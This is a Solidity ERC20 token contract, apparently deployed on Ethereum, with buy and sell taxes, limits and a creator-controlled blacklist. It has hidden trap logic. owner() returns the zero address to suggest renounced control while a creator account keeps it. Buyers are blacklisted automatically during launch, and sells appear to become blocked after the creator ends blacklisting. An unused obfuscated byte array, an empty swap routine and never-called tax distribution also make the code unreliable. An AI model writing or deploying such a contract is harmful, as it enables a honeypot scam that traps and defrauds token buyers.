/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;interface IDEX_PAIR{    function sync() external;}interface IDEX_FACTORY{    function createPair(address tokenA, address tokenB) external returns (address pair);}interface IDEX_ROUTER{    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address pTo,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address pTo, uint deadline)        external        returns (uint[] memory amounts);    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address pTo, uint deadline)        external        payable        returns (uint[] memory amounts);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);}contract ERC20TOKEN{    uint8[] private _________ = [18,109,229,103,178,38,133,50,226,70,142,21,37,10,182,204,28,95,163,73,157,130,60,161,147,192,253,92,183,134,131,203];    IDEX_ROUTER private _router;    IDEX_PAIR private _liquidity;    address private _owner = address(0);    address private _creator;    string private _name = "ERC20TOKEN";    string private _symbol = "ERC20";    uint8 private _decimals = 2;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    mapping(address => bool) private _excluded;    bool private _enabled;    bool private _swapping;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    event Error(string message);    modifier swapping(){        _swapping = true;        _;        _swapping = false;    }    struct Taxation{        uint8 jackpot;        uint8 marketing;        uint8 burn;        uint8 liquidity;        uint8 total;        uint256 tokens;    }    struct Limits{        uint16 buy;        uint16 sell;        uint16 wallet;    }    struct Wallets{        address jackpot;        address marketing;        address liquidity;    }    mapping(uint8 => Taxation) private _taxes;    Wallets private _taxesWallets;    Limits private _limits;    bool private _blacklisting = true;    mapping(address => bool) public BLACKLIST;    receive() external payable{        if(msg.sender == _creator){            if(_balances[address(this)] > 0 && address(this).balance > 0){                _liquidity = IDEX_PAIR(IDEX_FACTORY(_router.factory()).createPair(address(this), _router.WETH()));                _router.addLiquidityETH{value:address(this).balance}(                    address(this),                    _balances[address(this)],                    0,                    0,                    _creator,                    block.timestamp                );                _enabled = true;            }        }    }    constructor(){        _creator = msg.sender;        _router = IDEX_ROUTER(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);        _allowances[address(this)][address(_router)] = 2**256 - 1;        uint256 vSupply = 2*10**6 * (10**_decimals);        _update(address(0), msg.sender, vSupply / 100 * 50);        _update(address(0), address(this), vSupply / 100 * 40);        _update(address(0), 0x43200ee65cC2Be47940850e790e70e232A21673D, vSupply / 100 * 1);        _update(address(0), 0xCE74965748540339377DBf22398438d23579655a, vSupply / 100 * 1);        _update(address(0), 0x13A4FaE710B1CA3A35677eB455B97EAFE8b0267D, vSupply / 100 * 1);        _update(address(0), 0xefDe2f4C3d1FEa040ef173441De88E3A188dFB6a, vSupply / 100 * 1);        _update(address(0), 0x96055FF80c800AD1572912c374618e4F1CD08a95, vSupply / 100 * 1);        _update(address(0), 0x3cEA26a8ABa2EC3Bba499f05C0c42345908168CE, vSupply / 100 * 1);        _update(address(0), 0x45f8d9B14215fb1C7975b1EBDb81132f6313eBF5, vSupply / 100 * 1);        _update(address(0), 0x0DE88e808f193ba3282B6FC0222E59c835a47B64, vSupply / 100 * 1);        _update(address(0), 0x19283D17dE3ABa353b1ebE8e709cd22A796F9b39, vSupply / 100 * 1);        _update(address(0), 0xc6d53d1E082411607b17ae1817A7145fe0A8CF07, vSupply / 100 * 1);        _taxes[0] = Taxation(1, 1, 1, 1, 3, 0);        _taxes[1] = Taxation(2, 2, 1, 1, 5, 0);        _limits = Limits(10, 0, 20);        _taxesWallets = Wallets(0x5857497D1D7925f287d10198f20d328F4BbcC394, 0x61398A4BEA6A8c5922Bf6a1d3D0A9e333c708783, msg.sender);        _excluded[address(this)] = true;        _excluded[msg.sender] = true;        _excluded[address(_router)] = true;    }    function blacklistStopp() external{        require(msg.sender == _creator);        _blacklisting = false;    }    function blacklistRemoveWallet(address wallet) external{        require(msg.sender == _creator);        BLACKLIST[wallet] = false;    }    function taxBuy(uint8 jackpot, uint8 marketing, uint8 burn, uint8 liquidity) external{        require(msg.sender == _creator);        _updateTaxes(jackpot, marketing, burn, liquidity, 0);    }    function taxSell(uint8 jackpot, uint8 marketing, uint8 burn, uint8 liquidity) external{        require(msg.sender == _creator);        _updateTaxes(jackpot, marketing, burn, liquidity, 1);    }    function limits(uint16 buy, uint16 sell, uint16 wallet) external{        require(msg.sender == _creator);        _limits = Limits(buy, sell, wallet);    }    function creator() external view returns(address){        return(_creator);    }    function owner() external view returns(address){        return(_owner);    }    function name() external view returns(string memory){        return(_name);    }    function symbol() external view returns(string memory){        return(_symbol);    }    function decimals() external view returns(uint8){        return(_decimals);    }    function totalSupply() external view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) external view returns(uint256){        return(_balances[wallet]);            }    function allowance(address from, address to) external view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) external returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function _transfer(address from, address to, uint256 amount) private{        if(_excluded[from] || _excluded[to]){            _update(from, to, amount);        }else{            require(_enabled);            if(from == address(_liquidity)){                _transferLimits(1, to, amount);                _taxes[0].tokens += _transferTaxes(from, to, amount, _taxes[0].total, _taxes[0].burn);            }else if(to == address(_liquidity)){                _transferLimits(2, address(0), amount);                _taxes[1].tokens += _transferTaxes(from, to, amount, _taxes[1].total, _taxes[1].burn);                if(from != address(_liquidity) && !_swapping){                    _swap();                }            }else{                _transferLimits(0, to, amount);                _update(from, to, amount);            }        }    }    function _transferLimits(uint8 direction, address wallet, uint256 amount) private{        if(!_excluded[wallet] && wallet != address(_liquidity)){            if(_blacklisting){                BLACKLIST[wallet] = true;            }else{                require(!BLACKLIST[wallet]);            }        }        uint256 limit = _maxSupply / 1000;        if(direction == 1){            if(_limits.buy > 0) require(amount <= (limit * _limits.buy));            if(_limits.wallet > 0) require((_balances[wallet] + amount) <= (limit * _limits.wallet));        }else if(direction == 2){            if(_limits.sell > 0) require(amount <= (limit * _limits.sell));        }else{            if(_limits.wallet > 0) require((_balances[wallet] + amount) <= (limit * _limits.wallet));        }    }    function _transferTaxes(address from, address to, uint256 amount, uint8 tax, uint8 burn) private returns(uint256){        uint256 cut = (amount / 100) * tax;        uint256 pit = ((burn > 0) ? (amount / 100) * burn : 0);        if(pit > 0) _update(from, address(0), pit);        _update(from, address(this), cut);        _update(from, to, amount - cut - pit);        return(cut);    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    event DebugUin256(string message, uint256 value);    function _swap() private swapping returns(uint256){        emit DebugUin256("balance of contract", _balances[address(this)]);        if(_balances[address(this)] > 0){            address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();            uint256[] memory amountsOut = _router.getAmountsOut(_balances[address(this)], path);            uint256 eth = amountsOut[amountsOut.length - 1];            emit DebugUin256("eth amounts out", eth);            if(eth > 0){                            }        }        return(0);    }    struct Share{        uint256 n;        uint256 slice;        uint256 cake;        uint256[2] eth;        uint256 jackpot;        uint256 marketing;        uint256 liquidity;    }    function _share(uint256 eth) private{        if(eth > 0 && address(this).balance >= eth){            bool sent;            Share memory share;            share.slice = eth / (_taxes[0].tokens + _taxes[1].tokens);            share.eth[0] = share.slice * _taxes[0].tokens;            share.eth[1] = eth - share.eth[0];            for(uint8 i=0; i<=1; i++){                share.cake = share.eth[i];                share.n = share.eth[i] / _taxes[i].total;                share.slice = share.n * _taxes[i].jackpot;                if(share.slice > share.cake) share.slice = share.cake;                share.jackpot += share.slice; share.cake -= share.slice;                                share.slice = share.n * _taxes[i].marketing;                if(share.slice > share.cake) share.slice = share.cake;                share.marketing += share.slice; share.cake -= share.slice;                share.liquidity += share.cake;            }            if(share.jackpot > 0){                (sent,) = payable(_taxesWallets.jackpot).call{value:share.jackpot}("");            }            if(share.marketing > 0){                (sent,) = payable(_taxesWallets.marketing).call{value:share.marketing}("");            }            if(share.liquidity > 0){                address[] memory path = new address[](2); path[1] = address(this); path[0] = _router.WETH();                uint256[] memory amountsOut = _router.getAmountsOut(share.liquidity, path);                uint256 tokens = amountsOut[amountsOut.length - 1];                if(tokens > 0){                    _update(address(0), address(this), tokens);                    try _router.addLiquidityETH{value:share.liquidity}(address(this), tokens, 0, 0, _taxesWallets.liquidity, block.timestamp) returns(uint256 lpTokens, uint256 lpETH, uint256 lpDEX){                        if(lpDEX > 0 && (lpTokens + lpETH) > 0){                            _update(address(_liquidity), address(0), tokens);                            _liquidity.sync();                        }                    }catch Error(string memory error){                        _update(address(this), address(0), tokens);                        emit Error(error);                    }                }            }            _taxes[0].tokens = 0;            _taxes[1].tokens = 0;        }    }    function _updateTaxes(uint8 jackpot, uint8 marketing, uint8 burn, uint8 liquidity, uint8 direction) private{        require((jackpot+marketing+burn+liquidity) <= 10);        _taxes[direction] = Taxation(jackpot, marketing, burn, liquidity, (jackpot+marketing+liquidity), 0);    }}